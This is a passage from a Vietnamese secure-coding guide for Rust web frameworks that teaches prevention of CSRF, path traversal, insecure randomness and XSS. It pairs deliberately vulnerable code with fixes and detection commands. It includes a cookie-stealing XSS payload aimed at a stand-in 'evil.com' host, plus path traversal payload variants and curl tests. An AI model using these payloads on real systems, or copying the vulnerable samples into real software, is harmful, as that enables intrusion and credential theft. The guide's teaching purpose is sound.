    // Thực hiện chuyển tiền mà không verify CSRF token
    let user_id = session.get::<i64>("user_id").unwrap().unwrap();
    do_transfer(user_id, &form.to, form.amount).await;
    HttpResponse::Ok().finish()
}

// ✅ GOOD 1: Dùng CSRF token với actix-csrf
use actix_csrf::{Csrf, CsrfMiddleware};
use actix_web::{web, App, HttpServer, middleware};

async fn create_app() {
    HttpServer::new(|| {
        App::new()
            .wrap(CsrfMiddleware::new())  // Tự động validate CSRF tokens
            .route("/transfer", web::post().to(transfer_money_safe))
    })
    .bind("0.0.0.0:8080")
    .unwrap()
    .run()
    .await
    .unwrap();
}

// ✅ GOOD 2: SameSite=Strict Cookie (đơn giản nhất)
use actix_web::cookie::{Cookie, SameSite};

fn create_session_cookie(session_id: &str) -> Cookie {
    Cookie::build("session", session_id)
        .http_only(true)
        .secure(true)
        .same_site(SameSite::Strict)  // Browser không gửi cross-site!
        .path("/")
        .finish()
}

// ✅ GOOD 3: Bearer token thay cookie (CSRF-safe by design)
use axum::{extract::TypedHeader, headers::{Authorization, authorization::Bearer}};

async fn transfer_money_bearer(
    TypedHeader(auth): TypedHeader<Authorization<Bearer>>,
    Json(form): Json<TransferForm>,
) -> impl IntoResponse {
    // Bearer token KHÔNG tự động gửi bởi browser → không bị CSRF
    let claims = verify_jwt(auth.token()).await?;
    do_transfer(claims.user_id, &form.to, form.amount).await;
    Json(serde_json::json!({"status": "ok"}))
}
```

### 7. Phòng ngừa

```bash
# Kiểm tra SameSite cookie setting
rg --type rust 'SameSite' || echo "Check if cookie-based auth uses SameSite"

# Test CSRF manually:
# 1. Login và lấy session cookie
# 2. Tạo form từ domain khác POST đến API
# 3. Kiểm tra server có reject không
```

```toml
# Cargo.toml
[dependencies]
# Actix:
actix-csrf = "0.7"
# Hoặc Tower (Axum):
tower-sessions = "0.11"
```

---

## SA-10: Path Traversal

### 1. Tên

**Path Traversal** (Directory Traversal / ../ Attack)

### 2. Phân loại

- **Lĩnh vực:** Security & Auth
- **Danh mục con:** File System Security / Input Validation
- **Mã định danh:** SA-10

### 3. Mức nghiêm trọng

🔴 **CRITICAL** — Kẻ tấn công đọc files tùy ý ngoài thư mục được phép (config files, /etc/passwd, private keys), hoặc ghi đè files hệ thống.

### 4. Vấn đề

Khi path được xây dựng từ user input mà không validate, kẻ tấn công dùng `../` sequences để thoát ra ngoài thư mục cho phép. URL encoding (`%2e%2e%2f`) và Unicode normalization có thể bypass naive checks.

```
Path Traversal attack:

  Base dir:   /var/app/uploads/
  User input: "../../etc/passwd"

  Path join:  /var/app/uploads/../../etc/passwd
                              ──────────────────
                              Normalize thành: /etc/passwd

  Kết quả: App đọc và trả về /etc/passwd!

  Variants:
  - ../../../etc/shadow
  - ..%2f..%2fetc%2fpasswd  (URL encoded)
  - ....//....//etc/passwd  (double dot bypass)
  - /absolute/path/bypass
```

### 5. Phát hiện

```bash
# Tìm path join với user input
rg --type rust 'PathBuf::from\|path::Path::new\|join\s*\(' | grep -v 'test'
rg --type rust '(base_dir|upload_dir|file_path)\s*\.join\s*\(\s*\w*(user|request|param|input)'

# Tìm file operations với potential user-controlled paths
rg --type rust 'fs::read\|fs::write\|File::open\|File::create' -B 3 | grep 'unwrap\|user\|param'

# Tìm thiếu canonicalize
rg --type rust '\.join\(' | grep -v 'canonicalize'
```

### 6. Giải pháp

```rust
// ❌ BAD: Path traversal vulnerable
use std::{fs, path::PathBuf};
use actix_web::{web, HttpResponse};

async fn serve_file(
    path_param: web::Path<String>,
) -> HttpResponse {
    let base_dir = PathBuf::from("/var/app/uploads");
    let file_path = base_dir.join(&*path_param);  // TRAVERSAL! "../../../etc/passwd" works!

    match fs::read(&file_path) {
        Ok(content) => HttpResponse::Ok().body(content),
        Err(_) => HttpResponse::NotFound().finish(),
    }
}

// ✅ GOOD: Validate path với canonicalize
use std::{fs, path::{Path, PathBuf}};

fn safe_file_path(base_dir: &Path, user_input: &str) -> Result<PathBuf, &'static str> {
    // Loại bỏ leading slash để tránh absolute path bypass
    let sanitized = user_input.trim_start_matches('/');

    let joined = base_dir.join(sanitized);

    // canonicalize resolve tất cả symlinks và .. sequences
    let canonical = joined.canonicalize()
        .map_err(|_| "file not found")?;

    // Verify canonical path vẫn nằm trong base_dir
    if !canonical.starts_with(base_dir) {
        return Err("path traversal detected");
    }

    Ok(canonical)
}

async fn serve_file_safe(
    path_param: web::Path<String>,
) -> HttpResponse {
    let base_dir = PathBuf::from("/var/app/uploads")
        .canonicalize()  // Canonicalize base dir trước
        .expect("base dir must exist");

    match safe_file_path(&base_dir, &path_param) {
        Ok(safe_path) => {
            match fs::read(&safe_path) {
                Ok(content) => HttpResponse::Ok().body(content),
                Err(_) => HttpResponse::NotFound().finish(),
            }
        }
        Err(_) => HttpResponse::BadRequest().body("invalid path"),
    }
}

// ✅ GOOD: Whitelist-based approach (chỉ cho phép filename, không path)
fn validate_filename(name: &str) -> Result<&str, &'static str> {
    // Chỉ cho phép alphanum, dash, underscore, dot
    if name.chars().all(|c| c.is_alphanumeric() || ".-_".contains(c))
        && !name.starts_with('.')  // Không cho phép hidden files
        && !name.contains("..")   // Không cho phép path traversal
    {
        Ok(name)
    } else {
        Err("invalid filename")
    }
}
```

### 7. Phòng ngừa

```bash
# Test path traversal
curl "http://localhost:8080/files/../../../etc/passwd"
curl "http://localhost:8080/files/%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# Kiểm tra tất cả file serving endpoints
rg --type rust 'serve_file\|static_files\|download' -l

# Dùng tower-http ServeDir với built-in protection (Axum)
```

```toml
# Cargo.toml — ServeDir tự handle path traversal
[dependencies]
tower-http = { version = "0.5", features = ["fs"] }
```

---

## SA-11: Insecure Random (rand vs OsRng)

### 1. Tên

**Insecure Random** (Dùng PRNG không phù hợp cho cryptographic purposes)

### 2. Phân loại

- **Lĩnh vực:** Security & Auth
- **Danh mục con:** Cryptography / Randomness
- **Mã định danh:** SA-11

### 3. Mức nghiêm trọng

🟠 **HIGH** — Tokens, session IDs, và keys tạo từ PRNG có thể bị predict nếu attacker biết seed hoặc state. Dẫn đến session hijacking, token forgery, weak cryptographic keys.

### 4. Vấn đề

`rand::thread_rng()` (ChaCha12) là CSPRNG tốt nhưng seed từ OS — trong một số môi trường (containers, VMs) entropy có thể thấp lúc boot. `SmallRng` và `StdRng::seed_from_u64()` hoàn toàn không phù hợp cho security purposes.

```
Predictability scale:

  KHÔNG DÙNG cho security:
  ├── rand::rngs::SmallRng      → fast, NOT cryptographic
  ├── StdRng::seed_from_u64(42) → deterministic, trivially predictable
  └── rand::random::<u64>()     → may be ok but unclear

  DÙNG CHO security:
  ├── rand::rngs::OsRng          → direct /dev/urandom, CSPRNG ✓
  ├── getrandom::getrandom()     → OS entropy, CSPRNG ✓
  └── ring::rand::SystemRandom   → cryptographic strength ✓
```

### 5. Phát hiện

```bash
# Tìm SmallRng dùng cho token/session generation
rg --type rust 'SmallRng\|StdRng::seed_from_u64\|SeedableRng'

# Tìm rand::random hoặc thread_rng trong security context
rg --type rust '(session|token|key|nonce|salt)\s*=.*rand'
rg --type rust 'rand::random::<\|thread_rng\(\)' -B 5 | grep -i 'token\|session\|key\|secret'

# Tìm UUID generation với non-crypto random
rg --type rust 'Uuid::new_v4\|uuid::Uuid' -B 3 | grep -v 'OsRng'
```

### 6. Giải pháp

```rust
// ❌ BAD: SmallRng cho session token
use rand::{Rng, SeedableRng, rngs::SmallRng};

fn generate_session_token_insecure() -> String {
    let mut rng = SmallRng::from_entropy();  // NOT cryptographically secure!
    let token: String = (0..32)
        .map(|_| rng.sample(rand::distributions::Alphanumeric) as char)
        .collect();
    token
}

// ❌ BAD: Seeded với time — completely predictable
fn generate_token_predictable() -> u64 {
    use std::time::{SystemTime, UNIX_EPOCH};
    let seed = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs();
    let mut rng = rand::rngs::StdRng::seed_from_u64(seed);  // Predictable!
    rng.gen()
}

// ✅ GOOD: OsRng cho cryptographic randomness
use rand::RngCore;
use rand::rngs::OsRng;

fn generate_session_token() -> String {
    let mut bytes = [0u8; 32];
    OsRng.fill_bytes(&mut bytes);  // /dev/urandom — cryptographically secure
    hex::encode(bytes)
}

fn generate_api_key() -> String {
    let mut key = [0u8; 32];
    OsRng.fill_bytes(&mut key);
    base64::encode_config(key, base64::URL_SAFE_NO_PAD)
}

// ✅ GOOD: Dùng getrandom trực tiếp
use getrandom::getrandom;

fn generate_nonce() -> [u8; 16] {
    let mut nonce = [0u8; 16];
    getrandom(&mut nonce).expect("failed to get random bytes");
    nonce
}

// ✅ GOOD: UUID v4 với OsRng
use uuid::Uuid;

fn generate_request_id() -> Uuid {
    Uuid::new_v4()  // UUID::new_v4() dùng OsRng internally khi feature "v4" enabled
}

// ✅ GOOD: ring cho cryptographic operations
use ring::rand::{SecureRandom, SystemRandom};

fn generate_encryption_key() -> [u8; 32] {
    let rng = SystemRandom::new();
    let mut key = [0u8; 32];
    rng.fill(&mut key).expect("failed to generate key");
    key
}
```

### 7. Phòng ngừa

```toml
# Cargo.toml
[dependencies]
rand = { version = "0.8", features = ["getrandom"] }
getrandom = "0.2"
# Hoặc cho crypto operations:
ring = "0.17"
```

```bash
# Tìm SmallRng và non-OS seeded RNGs trong security context
rg --type rust 'SmallRng\|seed_from_u64\|from_seed'

# Review tất cả token/key generation functions
rg --type rust 'fn.*generate.*\(token\|key\|secret\|nonce\|salt\)' -l
```

---

## SA-12: XSS Trong Web Framework (Actix/Axum)

### 1. Tên

**XSS Trong Web Framework** (Cross-Site Scripting in Actix/Axum)

### 2. Phân loại

- **Lĩnh vực:** Security & Auth
- **Danh mục con:** Web Security / Injection
- **Mã định danh:** SA-12

### 3. Mức nghiêm trọng

🔴 **CRITICAL** — Cho phép inject và execute JavaScript tùy ý trong browser của user. Dẫn đến: session hijacking, credential theft, defacement, redirect đến malicious sites, keylogging.

### 4. Vấn đề

Rust web frameworks không tự động escape HTML. Khi render user input trực tiếp vào HTML response, kẻ tấn công inject `<script>` tags hoặc event handlers. Server-Side Rendering với template engines không escape là vector phổ biến nhất.

```
XSS Attack flow:

  Stored XSS:
  1. Attacker submit: name = "<script>fetch('evil.com?c='+document.cookie)</script>"
  2. App lưu vào DB không sanitize
  3. App render HTML: <div>Hello, <script>fetch(...)...</script></div>
  4. Victim browser execute script → cookie bị steal!

  Reflected XSS:
  GET /search?q=<script>alert(1)</script>
  Response: <h1>Results for: <script>alert(1)</script></h1>
  → Script execute trong browser victim!
```

### 5. Phát hiện

```bash
# Tìm HTML rendering với user data không escaped
rg --type rust 'format!\s*\(\s*"<[^"]*\{' | grep -v 'test'
rg --type rust 'HttpResponse.*body\s*\(\s*format!'

# Tìm template rendering (tera, askama) với |safe filter
rg --type rust '\|\s*safe\|raw\s*\)' --type html
rg '{% raw %}\|{{ .* | safe }}' --type html

# Tìm Content-Type text/html với user content
rg --type rust 'content_type\s*\(\s*"text/html"' -B 5

# Tìm askama/tera templates
rg --type rust 'Template\s*derive\|tera::Tera\|askama' -l
```

### 6. Giải pháp

```rust
// ❌ BAD: User input trực tiếp trong HTML
use actix_web::{web, HttpResponse};

async fn search_results(query: web::Query<SearchQuery>) -> HttpResponse {
    let html = format!(
        "<html><body><h1>Results for: {}</h1></body></html>",
        query.q  // XSS! q có thể là "<script>alert(1)</script>"
    );
    HttpResponse::Ok()
        .content_type("text/html")
        .body(html)
}

async fn user_profile(user: User) -> HttpResponse {
    let html = format!(
        r#"<div class="profile">
            <h2>{}</h2>  <!-- XSS nếu name có HTML -->
            <p>{}</p>
        </div>"#,
        user.name,    // Unescaped!
        user.bio      // Unescaped!
    );
    HttpResponse::Ok().content_type("text/html").body(html)
}

// ✅ GOOD: HTML escaping với askama (compile-time template)
use askama::Template;

#[derive(Template)]
#[template(source = r#"
<html><body>
    <h1>Results for: {{ query|escape }}</h1>
    {% for result in results %}
    <p>{{ result.title|escape }}</p>
    {% endfor %}
</body></html>
"#, ext = "html")]
struct SearchTemplate<'a> {
    query: &'a str,
    results: Vec<SearchResult>,
}

async fn search_results_safe(query: web::Query<SearchQuery>) -> impl actix_web::Responder {
    let tmpl = SearchTemplate {
        query: &query.q,
        results: do_search(&query.q).await,
    };
    // askama tự động escape HTML entities — {{ var }} là escaped
    // Chỉ {{ var|safe }} mới không escape — dùng cẩn thận!
    actix_web::HttpResponse::Ok()
        .content_type("text/html; charset=utf-8")
        .body(tmpl.render().unwrap())
}

// ✅ GOOD: Manual HTML escaping nếu không dùng template engine
fn html_escape(input: &str) -> String {
    input
        .replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&#x27;")
}

async fn safe_response(user_input: &str) -> HttpResponse {
    let safe_input = html_escape(user_input);
    let html = format!("<h1>Hello, {}</h1>", safe_input);
    HttpResponse::Ok().content_type("text/html").body(html)
}

// ✅ GOOD: Content Security Policy header (defense in depth)
use actix_web::middleware::DefaultHeaders;

fn add_security_headers() -> DefaultHeaders {
    DefaultHeaders::new()
        .add(("Content-Security-Policy",
              "default-src 'self'; script-src 'self'; style-src 'self'"))
        .add(("X-Content-Type-Options", "nosniff"))
        .add(("X-Frame-Options", "DENY"))
}

// ✅ GOOD: API-first approach — JSON thay HTML (XSS-safe by design)
use axum::Json;
use serde_json::json;

async fn search_api(query: web::Query<SearchQuery>) -> Json<serde_json::Value> {
    let results = do_search(&query.q).await;
    // JSON response không bị XSS — browser không execute JSON như HTML
    Json(json!({
        "query": query.q,
        "results": results
    }))
}
```

### 7. Phòng ngừa

```toml
# Cargo.toml — dùng template engine với auto-escaping
[dependencies]
askama = "0.12"    # Auto-escape by default
# Hoặc
tera = "1"         # Auto-escape cần enable trong config
# Hoặc
minijinja = "1"    # Auto-escape by default
```

```bash
# Kiểm tra templates có dùng |safe không đúng chỗ
rg '\|\s*safe\b' --type html
rg 'autoescape\s*=\s*false\|autoescape.*off'

# Test XSS trong tất cả user-facing endpoints
# Dùng OWASP ZAP hoặc Burp Suite
# Hoặc manual test với: <script>alert(document.domain)</script>

# CSP header validation
curl -I https://yourapp.com | grep 'Content-Security-Policy'

# Thêm clippy check cho format! với HTML
# (custom lint) hoặc review tất cả format!("...<html>...") usages
rg --type rust 'format!\s*\(\s*".*<' -n
```

---

## Tóm tắt mức độ ưu tiên

| Mã | Tên | Mức | Fix effort |
|----|-----|-----|-----------|
| SA-01 | Timing Side-Channel | 🔴 CRITICAL | Thấp — đổi `==` sang `ct_eq()` |
| SA-04 | Supply Chain Attack | 🔴 CRITICAL | Trung bình — vendor + cargo-deny |
| SA-05 | SQL Injection | 🔴 CRITICAL | Trung bình — parameterized queries |
| SA-06 | JWT Validation Thiếu | 🔴 CRITICAL | Thấp — fix Validation config |
| SA-08 | Hardcoded Secrets | 🔴 CRITICAL | Thấp — env vars + secret scan |
| SA-10 | Path Traversal | 🔴 CRITICAL | Thấp — canonicalize + starts_with |
| SA-12 | XSS | 🔴 CRITICAL | Trung bình — template engine |
| SA-02 | Zeroize Thiếu | 🟠 HIGH | Thấp — derive Zeroize |
| SA-03 | Dependency Audit Thiếu | 🟠 HIGH | Rất thấp — thêm CI step |
| SA-07 | TLS Verification Disabled | 🟠 HIGH | Rất thấp — xóa danger flag |
| SA-09 | CSRF Thiếu | 🟠 HIGH | Trung bình — SameSite cookie / CSRF middleware |
| SA-11 | Insecure Random | 🟠 HIGH | Thấp — đổi sang OsRng |

---

*Domain 04 — Security & Auth | Rust Engineering Failures Knowledge Base*
